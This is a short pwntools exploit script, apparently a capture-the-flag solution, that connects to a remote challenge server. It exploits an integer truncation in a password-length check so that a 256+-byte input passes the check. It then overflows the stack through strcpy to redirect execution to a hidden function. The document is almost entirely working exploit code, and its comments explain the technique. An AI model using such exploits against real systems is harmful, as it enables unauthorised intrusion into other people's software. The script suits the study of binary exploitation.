from pwn import *
context.arch = 'i386'

# p = process('./pwn')
p = remote('111.198.29.45',53636)

p.sendlineafter('Your choice:','1')
p.sendafter('username:','asd')

payload = 'A'*0x18 + p32(ELF('./pwn').sym['what_is_this'])
# make the eip point to function 'what_is_this' by stack overflow
p.sendafter("passwd:",payload.ljust(256+4,'B'))
# function check_password use the rigister al to store the length of passwd
# when we input the length of passwd is 256(0xff), 
# the rigister al could not store it, it will be zero(0)
# inorder to pass the judge(if ( v3 <= 3u || v3 > 8u )),
# we could intput the length of passwd is (256+3,256+8]
# then make stack overflow by fuction strcpy
p.recvuntil('Success\n')
print p.recv()
